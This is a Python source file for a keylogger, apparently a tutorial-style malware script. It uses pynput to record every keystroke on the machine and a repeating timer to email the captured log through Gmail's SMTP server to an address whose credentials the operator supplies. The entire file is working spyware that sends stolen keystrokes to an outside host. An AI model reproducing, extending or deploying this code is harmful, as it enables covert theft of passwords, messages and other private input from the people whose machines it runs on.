# encoding=utf8
import pynput.keyboard
import threading
import smtplib
#for email support

log = ""

class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = "Keylogger Started..."
        self.interval = time_interval
        self.email = email
        self.password = password

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def report(self):
        self.send_mail(self.email, self.password,  " " + self.log)
        # 
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        # 
        timer.start()

    def send_mail(self, email, password, message):
        # says that it takes variables as email address, password and the message
        server = smtplib.SMTP("smtp.gmail.com", 587)
        # communicating with the Google's mail server by using the class from smtplib
        # google runs its server on port 587
        server.starttls()
        # starts the connection with the server
        server.login(email, password)
        # 
        server.sendmail(email, email, message)
        # 
        server.quit()
        # stops the connection after sending an email


    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()